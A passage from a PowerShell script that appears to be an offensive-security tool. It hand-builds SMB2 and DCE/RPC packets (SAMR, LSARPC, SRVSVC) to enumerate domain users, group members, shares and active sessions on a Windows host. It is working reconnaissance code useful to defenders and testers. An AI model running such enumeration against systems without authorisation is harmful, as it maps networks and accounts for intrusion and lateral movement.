                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                    'OpenDomain'
                    {    
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMROpenDomain $SAMR_connect_handle $SID_count $LSA_domain_SID
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x07,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                    'OpenGroup'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMROpenGroup $SAMR_domain_handle $SAMR_RID
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }
                        
                    }

                    'ParseLookupRids'
                    {
                        [Byte[]]$response_user_count_bytes = $client_receive[140..143]
                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)
                        $response_user_start = $response_user_count * 8 + 164
                        $response_user_end = $response_user_start
                        $response_user_length_start = 152
                        $response_user_list = @()
                        $i = 0

                        while($i -lt $response_user_count)
                        {
                            $response_user_object = New-Object PSObject
                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]
                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)
                            $response_user_end = $response_user_start + $response_user_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]
                            
                            if($response_actual_count % 2)
                            {
                                $response_user_start += $response_user_length + 14
                            }
                            else
                            {
                                $response_user_start += $response_user_length + 12
                            }

                            $response_user = [System.BitConverter]::ToString($response_user_bytes)
                            $response_user = $response_user -replace "-00",""
                            $response_user = $response_user.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Username $response_user
                            $response_user_length_start = $response_user_length_start + 8
                            $response_user_list += $response_user_object
                            $i++
                        }

                        if($Action -eq 'All')
                        {
                            Write-Output "$Group Users:"
                        }
                        
                        Write-Output $response_user_list | Sort-Object -property Username |Format-Table -AutoSize
                        $stage = 'CloseRequest'
                    }

                    'ParseLookupSids'
                    {
                        [Byte[]]$response_domain_count_bytes = $client_receive[144..147]
                        $response_domain_count = [System.BitConverter]::ToInt16($response_domain_count_bytes,0)
                        $response_domain_start = $response_domain_count * 12 + 172
                        $response_domain_end = $response_domain_start
                        $response_domain_length_start = 160
                        $response_domain_list = @()
                        $i = 0

                        while($i -lt $response_domain_count)
                        {
                            [Byte[]]$response_domain_length_bytes = $client_receive[$response_domain_length_start..($response_domain_length_start + 1)]
                            $response_domain_length = [System.BitConverter]::ToInt16($response_domain_length_bytes,0)
                            $response_domain_end = $response_domain_start + $response_domain_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_domain_start - 4)..($response_domain_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_domain_bytes = $client_receive[$response_domain_start..($response_domain_end - 1)]
                            
                            if($response_actual_count % 2)
                            {
                                $response_domain_start += $response_domain_length + 42
                            }
                            else
                            {
                                $response_domain_start += $response_domain_length + 40
                            }

                            $response_domain = [System.BitConverter]::ToString($response_domain_bytes)
                            $response_domain = $response_domain -replace "-00",""
                            $response_domain = $response_domain.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_domain = New-Object System.String ($response_domain,0,$response_domain.Length)
                            $response_domain_list += $response_domain
                            $response_domain_length_start = $response_domain_length_start + 12
                            $i++
                        }

                        [Byte[]]$response_user_count_bytes = $client_receive[($response_domain_start - 4)..($response_domain_start - 1)]         
                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)
                        $response_user_start = $response_user_count * 16 + $response_domain_start + 12
                        $response_user_end = $response_user_start
                        $response_user_length_start = $response_domain_start + 4
                        $response_user_list = @()
                        $i = 0

                        while($i -lt $response_user_count)
                        {
                            $response_user_object = New-Object PSObject
                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]
                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)
                            $response_SID_index_start = $response_user_length_start + 8
                            [Byte[]]$response_SID_index_bytes = $client_receive[$response_SID_index_start..($response_SID_index_start + 3)]
                            $response_SID_index = [System.BitConverter]::ToInt16($response_SID_index_bytes,0)
                            $response_user_end = $response_user_start + $response_user_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]

                            if($response_actual_count % 2)
                            {
                                $response_user_start += $response_user_length + 14
                            }
                            else
                            {
                                $response_user_start += $response_user_length + 12
                            }

                            $response_user = [System.BitConverter]::ToString($response_user_bytes)
                            $response_user = $response_user -replace "-00",""
                            $response_user = $response_user.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Username $response_user
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Domain $response_domain_list[$response_SID_index]
                            $response_user_length_start = $response_user_length_start + 16
                            $response_user_list += $response_user_object
                            $i++
                        }

                        if($Action -eq 'All')
                        {
                            Write-Output "$Group Group Members:"
                        }
                        
                        Write-Output $response_user_list | Sort-Object -property Username |Format-Table -AutoSize
                        $stage = 'CloseRequest'
                    }

                    'ParseSRVSVC'
                    {
                        $response_object_list = @()
                        $share_list = @()
                        [Byte[]]$response_count_bytes = $client_receive[152..155]
                        $response_count = [System.BitConverter]::ToInt32($response_count_bytes,0)
                        $response_item_index = 164
                        $i = 0

                        while($i -lt $response_count)
                        {

                            if($i -gt 0)
                            {

                                if($response_item_length % 2)
                                {
                                    $response_item_index += $response_item_length * 2 + 2
                                }
                                else
                                {
                                    $response_item_index += $response_item_length * 2
                                }

                            }
                            else
                            {
                                
                                if($action_stage -eq 'Share')
                                {
                                    $response_item_index += $response_count * 12
                                }
                                else
                                {
                                    $response_item_index += $response_count * 16
                                }

                            }

                            $response_item_object = New-Object PSObject
                            [Byte[]]$response_item_length_bytes = $client_receive[$response_item_index..($response_item_index + 3)]
                            $response_item_length = [System.BitConverter]::ToInt32($response_item_length_bytes,0)
                            $response_item_index += 12
                            [Byte[]]$response_item_bytes = $client_receive[($response_item_index)..($response_item_index + ($response_item_length * 2 - 1))]
                            $response_item = [System.BitConverter]::ToString($response_item_bytes)
                            $response_item = $response_item -replace "-00",""
                            $response_item = $response_item.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_item = New-Object System.String ($response_item,0,$response_item.Length)
                            
                            if($response_item_length % 2)
                            {
                                $response_item_index += $response_item_length * 2 + 2
                            }
                            else
                            {
                                $response_item_index += $response_item_length * 2
                            }
                            
                            [Byte[]]$response_item_length_bytes = $client_receive[$response_item_index..($response_item_index + 3)]
                            $response_item_length = [System.BitConverter]::ToInt32($response_item_length_bytes,0)
                            $response_item_index += 12
                            [Byte[]]$response_item_2_bytes = $client_receive[($response_item_index)..($response_item_index + ($response_item_length * 2 - 1))]
                            $response_item_2 = [System.BitConverter]::ToString($response_item_2_bytes)
                            $response_item_2 = $response_item_2 -replace "-00",""
                            $response_item_2 = $response_item_2.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_item_2 = New-Object System.String ($response_item_2,0,$response_item_2.Length)

                            if($action_stage -eq 'Share')
                            {
                                $share_list += $response_item
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Share $response_item
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Description $response_item_2
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name "Access Mask" ""
                            }
                            else
                            {
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Username $response_item_2
                                Add-Member -InputObject $response_item_object -MemberType NoteProperty -Name Source $response_item
                            }

                            $response_object_list += $response_item_object
                            $i++
                        }

                        if($Action -eq 'All' -and $action_stage -eq 'Share')
                        {
                            Write-Output "Shares:"
                        }
                        elseif($Action -eq 'All' -and $action_stage -eq 'NetSession')
                        {
                            Write-Output "NetSessions:"
                            Write-Output $response_object_list | Sort-Object -property Share |Format-Table -AutoSize
                        }

                        if($Action -eq 'NetSession')
                        {
                            Write-Output $response_object_list | Sort-Object -property Share |Format-Table -AutoSize
                        }

                        $stage = 'CloseRequest'
                    }

                    'ParseUsers'
                    {
                        [Byte[]]$response_user_count_bytes = $client_receive[148..151]
                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)
                        $response_user_start = $response_user_count * 12 + 172
                        $response_user_end = $response_user_start
                        $response_RID_start = 160
                        $response_user_length_start = 164
                        $response_user_list = @()
                        $i = 0

                        while($i -lt $response_user_count)
                        {
                            $response_user_object = New-Object PSObject
                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]
                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)
                            [Byte[]]$response_RID_bytes = $client_receive[$response_RID_start..($response_RID_start + 3)]
                            $response_RID = [System.BitConverter]::ToInt16($response_RID_bytes,0)
                            $response_user_end = $response_user_start + $response_user_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]
                            
                            if($response_actual_count % 2)
                            {
                                $response_user_start += $response_user_length + 14
                            }
                            else
                            {
                                $response_user_start += $response_user_length + 12
                            }

                            $response_user = [System.BitConverter]::ToString($response_user_bytes)
                            $response_user = $response_user -replace "-00",""
                            $response_user = $response_user.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Username $response_user
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name RID $response_RID
                            $response_user_length_start = $response_user_length_start + 12
                            $response_RID_start = $response_RID_start + 12
                            $response_user_list += $response_user_object
                            $i++
                        }

                        if($Action -eq 'All')
                        {
                            Write-Output "Local Users:"
                        }

                        Write-Output $response_user_list | Sort-Object -property Username |Format-Table -AutoSize
                        $stage = 'CloseRequest'
                    }
                
                    'QueryGroupMember'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRQueryGroupMember $group_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x19,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }
                        
                    }

                    'QueryInfoRequest'
                    {          
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2QueryInfoRequest 0x01 0x05 0x18,0x00,0x00,0x00 0x68,0x00 $file_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data 
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }
                
                    'ReadRequest'
                    {
                        Start-Sleep -m $Sleep
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2ReadRequest $file_ID
                        $packet_SMB_data["Length"] = 0x00,0x04,0x00,0x00
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data 
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data 
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        
                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                    'RPCBind'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_RPC_data = New-PacketRPCBind $frag_length $call_ID $num_ctx_items 0x00,0x00 $named_pipe_UUID $named_pipe_UUID_version
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }
                        
                    }

                    'SAMRCloseRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRClose $SAMR_domain_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x01,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }
            
                    'StatusPending'
                    {
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $stage = $stage_next
                        }

                    }

                    'StatusReceived'
                    {
                        
                        switch ($stage_current)
                        {

                            'CloseRequest'
                            {

                                if($step -eq 1)
                                {
                                    $named_pipe = 0x73,0x00,0x61,0x00,0x6d,0x00,0x72,0x00 # samr
                                    $stage = 'CreateRequest'
                                }
                                elseif($action_stage -eq 'Share' -and $share_list.Count -gt 0)
                                {
                                    $stage = 'TreeConnect'
                                }
                                else
                                {
                                    $stage = 'TreeDisconnect'
                                }

                            }

                            'Connect2'
                            {
                                $step++
                                $SID_count = 0x04,0x00,0x00,0x00
                                [Byte[]]$SAMR_connect_handle = $client_receive[140..159]
                                $stage = 'OpenDomain'
                            }

                            'Connect5'
                            {
                                $step++
                                $SID_count = 0x04,0x00,0x00,0x00
                                [Byte[]]$SAMR_connect_handle = $client_receive[156..175]
                                $stage = 'OpenDomain'
                            }

                            'CreateRequest'
                            {

                                if($action_stage -eq 'Share')
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 2
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    $named_pipe_UUID_version = 0x03,0x00
                                    $stage_next = 'NetShareEnumAll'
                                }
                                elseif($action_stage -eq 'NetSession')
                                {
                                    $frag_length = 0x74,0x00
                                    $call_ID = 2
                                    $num_ctx_items = 0x02
                                    $named_pipe_UUID = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    $named_pipe_UUID_version = 0x03,0x00
                                    $stage_next = 'NetSessEnum'
                                }
                                elseif($step -eq 1)
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 5
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xac
                                    $named_pipe_UUID_version = 0x01,0x00

                                    if($action_stage -eq 'User')
                                    {
                                        $stage_next = 'Connect5'
                                    }
                                    else
                                    {
                                        $stage_next = 'Connect2'
                                    }

                                }
                                elseif($step -gt 2)
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 14
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    $named_pipe_UUID_version = 0x00,0x00
                                    $named_pipe = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    $stage_next = 'LSAOpenPolicy'
                                }
                                else
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 1
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    $named_pipe_UUID_version = 0x00,0x00
                                    $named_pipe = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    $stage_next = 'LSAOpenPolicy'
                                }

                                $file_ID = $client_receive[132..147]
                        
                                if($Refresh -and $stage -ne 'Exit')
                                {
                                    Write-Output "[+] Session refreshed"
                                    $stage = 'Exit'
                                }
                                elseif($step -ge 2)
                                {
                                    $stage = 'RPCBind'
                                }
                                elseif($stage -ne 'Exit')
                                {
                                    $stage = 'QueryInfoRequest'
                                }

                            }

                            'EnumDomainUsers'
                            {
                                $step++
                                $stage = 'ParseUsers'
                            }

                            'GetMembersInAlias'
                            {
                                $step++
                                [Byte[]]$SID_array = $client_receive[140..([System.BitConverter]::ToInt16($client_receive[3..1],0) - 1)]
                        
                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')
                                {
                                    $stage = 'SAMRCloseRequest'
                                }
                                else
                                {
                                    $named_pipe = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 # lsarpc
                                    $stage = 'CreateRequest'
                                }

                            }

                            'LookupNames'
                            {
                                $step++
                                [Byte[]]$SAMR_RID = $client_receive[152..155]
                                
                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')
                                {
                                    $stage = 'SAMRCloseRequest'
                                }
                                else
                                {
                                    
                                    if($step -eq 4)
                                    {
                                        $stage = 'OpenGroup'
                                    }
                                    else
                                    {
                                        $stage = 'OpenAlias'
                                    }

                                }

                            }

                            'LookupRids'
                            {
                                $step++
                                $stage = 'ParseLookupRids'
                            }

                            'LSAClose'
                            {
                                $stage = 'CloseRequest'
                            }

                            'LSALookupSids'
                            {
                                $stage = 'ParseLookupSids'
                            }

                            'LSAOpenPolicy'
                            {
                                [Byte[]]$policy_handle = $client_receive[140..159]

                                if($step -gt 2)
                                {
                                    $stage = 'LSALookupSids'
                                }
                                else
                                {
                                    $stage = 'LSAQueryInfoPolicy'    
                                }

                            }

                            'LSAQueryInfoPolicy'
                            {
                                [Byte[]]$LSA_domain_length_bytes = $client_receive[148..149]
                                $LSA_domain_length = [System.BitConverter]::ToInt16($LSA_domain_length_bytes,0)
                                [Byte[]]$LSA_domain_actual_count_bytes = $client_receive[168..171]
                                $LSA_domain_actual_count = [System.BitConverter]::ToInt32($LSA_domain_actual_count_bytes,0)
                                
                                if($LSA_domain_actual_count % 2)
                                {
                                    $LSA_domain_length += 2
                                }

                                [Byte[]]$LSA_domain_SID = $client_receive[(176 + $LSA_domain_length)..(199 + $LSA_domain_length)]
                                $stage = 'LSAClose'
                            }

                            'NetSessEnum'
                            {
                                $stage = 'ParseSRVSVC'
                            }

                            'NetShareEnumAll'
